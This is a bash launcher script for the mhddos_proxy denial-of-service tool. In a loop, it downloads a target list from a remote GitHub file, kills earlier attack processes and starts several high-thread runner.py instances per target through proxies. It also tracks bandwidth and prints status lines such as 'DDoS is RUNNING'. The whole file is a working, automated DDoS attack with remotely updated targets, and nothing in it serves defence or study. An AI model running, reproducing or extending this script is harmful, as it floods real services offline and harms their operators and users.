#!/bin/bash

# More safety, by turning some bugs into errors.
# Without `errexit` you don’t need ! and can replace
# PIPESTATUS with a simple $?, but I don’t do that.
set -o errexit -o pipefail -o noclobber -o nounset

# -allow a command to fail with !’s side effect on errexit
# -use return value from ${PIPESTATUS[0]}, because ! hosed $?
! getopt --test > /dev/null
if [[ ${PIPESTATUS[0]} -ne 4 ]]; then
    echo 'I am sorry, `getopt --test` failed in this environment. Please, install enhanced getopt.'
    exit 1
fi

OPTIONS=r:t:p:s:
LONGOPTS=refresh-interval:,thread-count:,process-count:,stats-interval:

# -regarding ! and PIPESTATUS see above
# -temporarily store output to be able to check for errors
# -activate quoting/enhanced mode (e.g. by writing out “--options”)
# -pass arguments only via   -- "$@"   to separate them correctly
! PARSED=$(getopt --options=$OPTIONS --longoptions=$LONGOPTS --name "$0" -- "$@")
if [[ ${PIPESTATUS[0]} -ne 0 ]]; then
    # e.g. return value is 1
    #  then getopt has complained about wrong arguments to stdout
    exit 2
fi

# read getopt’s output this way to handle the quoting right:
eval set -- "$PARSED"

refresh_interval="15m"
thread_count="1000"
process_count="5"
stats_interval="30"

# now enjoy the options in order and nicely split until we see --
while true; do
    case "$1" in
        -r|--refresh-interval)
            refresh_interval="$2"
            shift 2
            ;;
        -t|--thread-count)
            thread_count="$2"
            shift 2
            ;;
        -p|--process-count)
            process_count="$2"
            shift 2
            ;;
        -s|--stats-interval)
            stats_interval="$2"
            shift 2
            ;;
        --)
            shift
            break
            ;;
        *)
            echo "$1"
            echo "Programming error"
            exit 3
            ;;
    esac
done

PROXY_DIR=~/mhddos_proxy
PROXY_FILE=$PROXY_DIR/mhddos/files/proxies/proxies.txt

# Restart attacks and update targets every $refresh_interval
while true
do
  # kill old copies of mhddos_proxy
  echo -e "\nDDoS is (RE)STARTING. Killing old processes..."
  if pgrep -f runner.py &> /dev/null; then pkill -f runner.py &> /dev/null; fi
  if pgrep -f ./start.py &> /dev/null; then pkill -f /start.py &> /dev/null; fi
  if pgrep -f ifstat &> /dev/null; then pkill -f ifstat &> /dev/null; fi
  echo -e "\nDDoS is (RE)STARTING. Killing old processes... DONE!"

  # delete old proxy file if present
  if [ -f $PROXY_FILE ]; then
      rm $PROXY_FILE
  fi

  # Get number of targets in runner_targets
  number_of_targets=$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep -c "^[^#]")

  echo -e "\nNumber of targets: $number_of_targets"

  # Launch multiple mhddos_proxy instances with different targets.
  for (( i=1; i<=number_of_targets; i++ ))
  do
    target_command=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^[^#]")")

    for (( j=1; j<=process_count; j++ ))
    do
      echo -e "\npython3 runner.py $target_command -t $thread_count -p 25200 --rpc 1000&"

      cd $PROXY_DIR
      python3 runner.py $target_command -t $thread_count -p 25200 --rpc 1000&

      # wait till the first process initializes proxy file properly
      if [ ! -f $PROXY_FILE ]; then
        echo -e "\nWaiting for proxies initialization. This might take several minutes..."

        while [ ! -f $PROXY_FILE ]
        do
          sleep 1
        done

        echo -e "\nWaiting for proxies initialization. This might take several minutes... DONE!"
      fi
    done
  done

  ifstat -i eth0 -t -b $stats_interval/$stats_interval&

  echo -e "\nDDoS is RUNNING. Next update of targets list in $refresh_interval\nDDoS is monitoring eth0 interface (HH:MM:SS | Kbps in | Kbps out)\n\n"

  sleep $refresh_interval
  clear

done
